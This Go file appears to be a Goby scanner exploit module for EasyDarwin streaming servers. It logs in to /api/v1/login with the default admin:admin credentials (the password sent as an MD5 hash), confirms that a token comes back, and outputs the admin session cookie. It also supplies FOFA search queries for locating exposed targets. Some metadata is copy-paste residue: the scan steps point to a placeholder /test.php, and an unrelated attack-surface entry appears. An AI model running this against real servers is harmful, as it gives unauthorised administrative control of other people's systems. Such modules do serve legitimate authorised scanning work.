package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Description": "<p>EasyDarwin is a high-performance open source RTSP streaming media server developed based on the go language.</p><p>There is a default password vulnerability in EasyDarwin. Attackers can control the entire platform through the default password admin:admin and use administrator privileges to operate core functions.</p>",
    "Product": "EasyDarwin",
    "Homepage": "https://github.com/EasyDarwin",
    "DisclosureDate": "2023-08-06",
    "Author": "Sanyuee1@163.com",
    "FofaQuery": "title=\"EasyDarwin\" || body=\"easy-player-lib.min.js\"",
    "GobyQuery": "title=\"EasyDarwin\" || body=\"easy-player-lib.min.js\"",
    "Level": "1",
    "Impact": "<p>There is a default password vulnerability in EasyDarwin. Attackers can control the entire platform through the default password admin:admin and use administrator privileges to operate core functions.</p>",
    "Recommendation": "<p>1. Change the default password. The password must contain uppercase and lowercase letters, digits, and special characters, and must contain more than 8 digits.</p><p>2. Disable the public network from accessing the system if necessary.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "login",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CVSSScore": "9.3",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": [
            "shterm-Fortres-Machine"
        ]
    },
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "VulType": [
        "Default Password"
    ],
    "Translation": {
        "CN": {
            "Name": "EasyDarwin /api/v1/login 默认口令漏洞",
            "Product": "EasyDarwin",
            "Description": "<p>EasyDarwin 是一款高性能开源 RTSP 流媒体服务器，基于go语言研发。<br></p><p>EasyDarwin 存在默认口令漏洞，攻击者可通过默认口令 admin:admin 控制整个平台，使用管理员权限操作核心的功能。<br></p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>EasyDarwin 存在默认口令漏洞，攻击者可通过默认口令 admin:admin 控制整个平台，使用管理员权限操作核心的功能。<br><br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "Vulnerability of EasyDarwin /api/v1/login default password",
            "Product": "EasyDarwin",
            "Description": "<p>EasyDarwin is a high-performance open source RTSP streaming media server developed based on the go language.</p><p>There is a default password vulnerability in EasyDarwin. Attackers can control the entire platform through the default password admin:admin and use administrator privileges to operate core functions.</p>",
            "Recommendation": "<p>1. Change the default password. The password must contain uppercase and lowercase letters, digits, and special characters, and must contain more than 8 digits.</p><p>2. Disable the public network from accessing the system if necessary.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>There is a default password vulnerability in EasyDarwin. Attackers can control the entire platform through the default password admin:admin and use administrator privileges to operate core functions.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "Name": "Vulnerability of EasyDarwin /api/v1/login default password",
    "PocId": "10866"
}`
	sendPayload45GDFASDAxsi := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		uri := "/api/v1/login?username=admin&password=21232f297a57a5a743894a0e4a801fc3"
		getConfig := httpclient.NewGetRequestConfig(uri)
		getConfig.VerifyTls = false
		getConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, getConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			resp, _ := sendPayload45GDFASDAxsi(u)
			success := resp != nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "token")
			if success {
				ss.VulURL = u.Scheme() + "://admin:admin@" + u.HostInfo
			}
			return success
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "login" {
				resp, err := sendPayload45GDFASDAxsi(expResult.HostInfo)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
				} else if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "token") {
					expResult.Success = true
					expResult.Output = "Cookie: " + resp.Cookie
				} else {
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				}
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
